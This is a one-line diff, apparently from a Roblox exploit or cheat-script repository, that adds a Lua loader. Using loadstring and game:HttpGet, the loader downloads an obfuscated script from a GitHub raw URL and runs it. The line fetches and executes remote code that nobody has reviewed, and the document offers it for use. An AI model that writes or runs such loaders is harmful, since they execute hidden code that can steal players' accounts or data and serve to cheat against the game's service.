@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psxhub1337/script/main/obf_wwNM6mBp19CYmgz358elTp036fCMWyW6iLHw4579Vy4MbE2xX7867RPSexB74teL.lua", true))()
